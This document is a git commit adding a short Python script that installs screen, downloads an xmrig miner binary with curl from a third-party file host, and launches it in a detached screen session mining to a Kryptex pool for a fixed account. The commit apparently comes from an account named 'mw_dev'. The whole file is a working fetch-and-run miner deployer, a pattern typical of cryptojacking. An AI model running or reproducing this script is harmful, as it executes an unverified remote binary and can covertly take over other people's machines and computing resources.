ebbe97a3eb44053d6218af7c3e08903fe5c9f156
mw_dev <79410241+the-mw-dev@users.noreply.github.com>
2025-01-08 19:54:11 +0300

    Upload 9wh0sspwf4.py

---
+++ files/9wh0sspwf4.py
@@ -0,0 +1,10 @@
+import subprocess
+import os
+
+print("Введите имя воркера")
+name = input()
+os.system('apt update')
+os.system('apt install -y screen')
+os.system('curl -Lo xmrig https://file.mom/files/rnwc8gejsc.xmrig')
+os.system('chmod +x xmrig')
+subprocess.run(['screen', '-dmS', 'miner', './xmrig', '-o', 'sal.kryptex.network:8888', '-u', f'pimik@send-email.pro/{name}', '--tls', '-k', '-a', 'rx/0'])
